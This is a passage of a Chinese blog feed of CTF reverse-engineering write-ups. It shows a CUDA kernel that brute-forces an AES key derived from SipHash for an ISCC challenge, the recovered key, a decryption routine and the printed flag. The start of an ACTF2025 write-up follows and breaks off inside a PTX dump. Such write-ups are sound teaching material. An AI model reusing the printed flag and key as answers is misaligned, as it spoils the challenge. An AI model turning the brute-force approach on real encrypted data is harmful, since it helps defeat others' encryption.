class="meta">b = ROTATE(b, s) ^ a;\</span></span><br><span class="line"><span class="meta">d = ROTATE(d, t) ^ c;\</span></span><br><span class="line"><span class="meta">a = ROTATE(a, 32);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DOUBLE_ROUND(v0,v1,v2,v3)\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v0,v1,v2,v3,13,16);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v2,v1,v0,v3,17,21);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v0,v1,v2,v3,13,16);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v2,v1,v0,v3,17,21);</span></span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">uint64_t</span> <span class="title">siphash24_gpu</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* src, <span class="type">unsigned</span> <span class="type">long</span> src_sz, <span class="type">const</span> <span class="type">char</span> key[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span>* _key = (<span class="type">uint64_t</span>*)key;</span><br><span class="line"><span class="type">uint64_t</span> k0 = _le64toh(_key[<span class="number">0</span>]);</span><br><span class="line"><span class="type">uint64_t</span> k1 = _le64toh(_key[<span class="number">1</span>]);</span><br><span class="line"><span class="type">uint64_t</span> b = (<span class="type">uint64_t</span>)src_sz &lt;&lt; <span class="number">56</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span>* in = (<span class="type">uint64_t</span>*)src;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> v0 = k0 ^ <span class="number">0x102030405060708ULL</span>;</span><br><span class="line"><span class="type">uint64_t</span> v1 = k1 ^ <span class="number">0x90a0b0c0d0e0f00ULL</span>;</span><br><span class="line"><span class="type">uint64_t</span> v2 = k0 ^ k1 ^ <span class="number">0x123456789abcdefULL</span>;</span><br><span class="line"><span class="type">uint64_t</span> v3 = k1 ^ k0 ^ <span class="number">0x4953434343435349ULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (src_sz &gt;= <span class="number">8</span>) &#123;</span><br><span class="line"><span class="type">uint64_t</span> mi = _le64toh(*in);</span><br><span class="line">in += <span class="number">1</span>; src_sz -= <span class="number">8</span>;</span><br><span class="line">v3 ^= mi;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line">v0 ^= mi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> t = <span class="number">0</span>; <span class="type">uint8_t</span>* pt = (<span class="type">uint8_t</span>*)&amp;t; <span class="type">uint8_t</span>* m = (<span class="type">uint8_t</span>*)in;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">6</span>] = m[<span class="number">6</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">5</span>] = m[<span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">4</span>] = m[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">*((<span class="type">uint32_t</span>*)&amp;pt[<span class="number">0</span>]) = *((<span class="type">uint32_t</span>*)&amp;m[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">2</span>] = m[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">1</span>] = m[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">0</span>] = m[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">b |= _le64toh(t);</span><br><span class="line"></span><br><span class="line">v3 ^= b;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line">v0 ^= b; v2 ^= <span class="number">0xff</span>;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line"><span class="keyword">return</span> (v0 ^ v1) ^ (v2 ^ v3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">crack</span><span class="params">(<span class="type">uint8_t</span>* KeyOut, <span class="type">bool</span>* found, <span class="type">uint64_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 是否找到</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">atomicOr</span>((<span class="type">int</span>*)found,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> tid = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tid &gt; <span class="number">94ULL</span> * <span class="number">95ULL</span> * <span class="number">0xffffULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> rndList[<span class="number">16</span>];</span><br><span class="line"><span class="type">uint8_t</span> hash_plaintext[<span class="number">9</span>];</span><br><span class="line"><span class="type">uint8_t</span> key[<span class="number">16</span>];</span><br><span class="line"><span class="type">uint8_t</span> out[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> CHAR_RANGE = <span class="number">95</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> BASE_CHAR = <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过tid生成当前数值</span></span><br><span class="line"><span class="type">int</span> rnd_v = tid % <span class="number">0xFFFF</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> char_pos = tid / <span class="number">0xFFFF</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> c3 = BASE_CHAR + (char_pos % CHAR_RANGE);</span><br><span class="line">char_pos /= CHAR_RANGE;</span><br><span class="line"><span class="type">int</span> c2 = BASE_CHAR + (char_pos % CHAR_RANGE);</span><br><span class="line">char_pos /= CHAR_RANGE;</span><br><span class="line"><span class="type">int</span> c1 = BASE_CHAR + offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (c1 &lt; <span class="number">127</span> &amp;&amp; c2 &lt; <span class="number">127</span> &amp;&amp; c3 &lt; <span class="number">127</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 生成01排列</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rndList[i] = i + ((rnd_v &gt;&gt; (<span class="number">15</span> - i)) &amp; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">hash_plaintext[i] = hash_plaintext_template[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ISCC&#123;$c1$c2$c3&#125;</span></span><br><span class="line">hash_plaintext[<span class="number">5</span>] = c1;</span><br><span class="line">hash_plaintext[<span class="number">6</span>] = c2;</span><br><span class="line"></span><br><span class="line">hash_plaintext[<span class="number">7</span>] = c3;</span><br><span class="line"><span class="comment">// hash</span></span><br><span class="line"><span class="type">uint64_t</span> hash = <span class="built_in">siphash24_gpu</span>(hash_plaintext, <span class="number">9</span>, (<span class="type">const</span> <span class="type">char</span>*)rndList);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用hash扩展生成AES密钥</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">8</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">key[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">-8</span> + <span class="number">0x38</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// AES解密</span></span><br><span class="line"><span class="built_in">aesDecrypt</span>(key, <span class="number">16</span>, EncFlag, out, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">if</span> (out[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span> &amp;&amp; out[<span class="number">1</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; out[<span class="number">2</span>] == <span class="string">&#x27;C&#x27;</span> &amp;&amp; out[<span class="number">3</span>] == <span class="string">&#x27;C&#x27;</span> &amp;&amp; out[<span class="number">4</span>] == <span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">atomicExch</span>((<span class="type">int</span>*)found, <span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">KeyOut[i] = key[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> EncFlag_user[]&#123; <span class="number">0x9f</span>, <span class="number">0xb3</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x23</span>, <span class="number">0x82</span>, <span class="number">0x19</span>, <span class="number">0x7d</span>, <span class="number">0xe7</span>, <span class="number">0x2a</span>, <span class="number">0x8b</span>, <span class="number">0x20</span>, <span class="number">0x0c</span>, <span class="number">0x5b</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xa0</span>, <span class="number">0x63</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0xc2</span>, <span class="number">0x51</span>, <span class="number">0xde</span>, <span class="number">0x86</span>, <span class="number">0x1b</span>, <span class="number">0x87</span>, <span class="number">0x2f</span>, <span class="number">0x31</span>, <span class="number">0x6b</span>, <span class="number">0xbc</span>, <span class="number">0xfa</span>, <span class="number">0x5b</span>, <span class="number">0x9a</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x8b</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x6c</span>, <span class="number">0x1d</span>, <span class="number">0x94</span>, <span class="number">0xba</span>, <span class="number">0x2f</span>, <span class="number">0x37</span> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">EncFlag_user[i] ^= <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(S, S_user, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(inv_S, inv_S_user, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(EncFlag, EncFlag_user, <span class="number">16</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(rcon, rcon_user, <span class="number">40</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(hash_plaintext_template, <span class="string">&quot;ISCC&#123;xxx&#125;&quot;</span>, <span class="number">9</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> resultKey[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"><span class="type">bool</span> found_ = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span>* KeyOut;</span><br><span class="line"><span class="type">bool</span>* found;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMalloc</span>(&amp;KeyOut, <span class="number">16</span> * <span class="built_in">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line"><span class="built_in">cudaMalloc</span>(&amp;found, <span class="number">1</span> * <span class="built_in">sizeof</span>(<span class="type">bool</span>));</span><br><span class="line"><span class="built_in">cudaMemset</span>(found, <span class="number">0</span>, <span class="built_in">sizeof</span>(<span class="type">bool</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个字节在用户层循环</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">94</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tring crack the block %d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span> TOTAL_COMBINATIONS = <span class="number">94ULL</span> * <span class="number">95ULL</span> * <span class="number">0xffffULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> blockSize = <span class="number">256</span>;</span><br><span class="line"><span class="type">uint64_t</span> gridSize = (TOTAL_COMBINATIONS + blockSize - <span class="number">1</span>) / blockSize;</span><br><span class="line">crack &lt;&lt; &lt;gridSize, blockSize &gt;&gt; &gt; (KeyOut, found,i);</span><br><span class="line"><span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpy</span>(&amp;found_, found, <span class="number">1</span>, cudaMemcpyDeviceToHost);</span><br><span class="line"><span class="keyword">if</span> (found_)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cudaMemcpy</span>(resultKey, KeyOut, <span class="number">16</span>, cudaMemcpyDeviceToHost);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Found key: &quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, resultKey[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">cudaMemset</span>(found, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No result.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cudaFree</span>(KeyOut);</span><br><span class="line"><span class="built_in">cudaFree</span>(found);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="获得密钥解密"><a href="#获得密钥解密" class="headerlink" title="获得密钥解密"></a>获得密钥解密</h1><p>CUDA爆破得到密钥为：</p><blockquote><p>0x54,0x8e,0x7a,0x3a,0x13,0x57,0xf3,0x00,0x00,0x3a,0x00,0x7a,0x00,0x8e,0x00,0x54</p></blockquote><p><img src="/2025/05/25/ISCC-Enigma/image-18.png" alt="alt text"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> EncFlag[]&#123; <span class="number">0x9f</span>, <span class="number">0xb3</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x23</span>, <span class="number">0x82</span>, <span class="number">0x19</span>, <span class="number">0x7d</span>, <span class="number">0xe7</span>, <span class="number">0x2a</span>, <span class="number">0x8b</span>, <span class="number">0x20</span>, <span class="number">0x0c</span>, <span class="number">0x5b</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xa0</span>, <span class="number">0x63</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0xc2</span>, <span class="number">0x51</span>, <span class="number">0xde</span>, <span class="number">0x86</span>, <span class="number">0x1b</span>, <span class="number">0x87</span>, <span class="number">0x2f</span>, <span class="number">0x31</span>, <span class="number">0x6b</span>, <span class="number">0xbc</span>, <span class="number">0xfa</span>, <span class="number">0x5b</span>, <span class="number">0x9a</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x8b</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x6c</span>, <span class="number">0x1d</span>, <span class="number">0x94</span>, <span class="number">0xba</span>, <span class="number">0x2f</span>, <span class="number">0x37</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> AesKey[<span class="number">16</span>]&#123; <span class="number">0x54</span>,<span class="number">0x8E</span>,<span class="number">0x7A</span>,<span class="number">0x3A</span>,<span class="number">0x13</span>,<span class="number">0x57</span>,<span class="number">0xF3</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x3A</span>,<span class="number">0x00</span>,<span class="number">0x7A</span>,<span class="number">0x00</span>,<span class="number">0x8E</span>,<span class="number">0x00</span>,<span class="number">0x54</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> Flag[<span class="number">48</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">EncFlag[i] ^= <span class="number">0x10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i+=<span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">aesDecrypt</span>(AesKey, <span class="number">16</span>, EncFlag + i, Flag + i, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.48s\n&quot;</span>, Flag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密得到Flag：</p><p><strong>ISCC{A35_128_51pH4sh_2-4_CTF_K3y3d_H4sh}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这题当时赛中很早就写出爆破解密脚本了，但是一直没爆出来，赛后和出题人咨询发现是密文错了，并且发现其实是程序本身出错了，xor 0x10的代码</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2025 Reverse Deeptx WP</title>
    <link href="https://tkazer.github.io/2025/04/27/ACTF-Deeptx/"/>
    <id>https://tkazer.github.io/2025/04/27/ACTF-Deeptx/</id>
    <published>2025-04-27T12:22:12.000Z</published>
    <updated>2025-04-27T12:56:34.530Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ACTF2025-Reverse-Deeptx-WP"><a href="#ACTF2025-Reverse-Deeptx-WP" class="headerlink" title="ACTF2025 Reverse Deeptx WP"></a>ACTF2025 Reverse Deeptx WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是和aliyunctf一样的Cuda图片解密题，不过这次第一层加密上了运动模糊卷积加密，导致图片解密到这一层没法再解密了，只能利用运动模糊还原算法来让图片尽可能清晰。这题因为Cuda的Sync卡了一天，没注意到Layer3加密中的几个Sync汇编，导致加密还原完全正确，但加密执行的流程错了。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序载入ida看到是cuda代码相关，这边复制了sbox、tbox、motion三个数组数据到device，读入了flag.bmp并跳过前面的bmp格式数据，载入了0x10000大小的数据，即256*256，进行了三次Layer加密计算，最后输出到图片。</p><p><img src="/2025/04/27/ACTF-Deeptx/image.png" alt="alt text"></p><p>直接用cuobjdump进行dump出ptx汇编代码。</p><p><img src="/2025/04/27/ACTF-Deeptx/image-1.png" alt="alt text"></p><p>ptx汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line">Fatbin elf code:</span><br><span class="line">================</span><br><span class="line">arch = sm_86</span><br><span class="line">code version = [1,7]</span><br><span class="line">host = linux</span><br><span class="line">compile_size = 64bit</span><br><span class="line"></span><br><span class="line">Fatbin elf code:</span><br><span class="line">================</span><br><span class="line">arch = sm_86</span><br><span class="line">code version = [1,7]</span><br><span class="line">host = linux</span><br><span class="line">compile_size = 64bit</span><br><span class="line"></span><br><span class="line">Fatbin ptx code:</span><br><span class="line">================</span><br><span class="line">arch = sm_86</span><br><span class="line">code version = [8,7]</span><br><span class="line">host = linux</span><br><span class="line">compile_size = 64bit</span><br><span class="line">compressed</span><br><span class="line">ptxasOptions =</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">.version 8.7</span><br><span class="line">.target sm_86</span><br><span class="line">.address_size 64</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">.const .align 1 .b8 cuda_sbox[256];</span><br><span class="line">.const .align 1 .b8 cuda_tbox[256];</span><br><span class="line">.const .align 4 .b8 cuda_motion[1024];</span><br><span class="line"></span><br><span class="line">.visible .entry _Z6Layer1PhS_(</span><br><span class="line">.param .u64 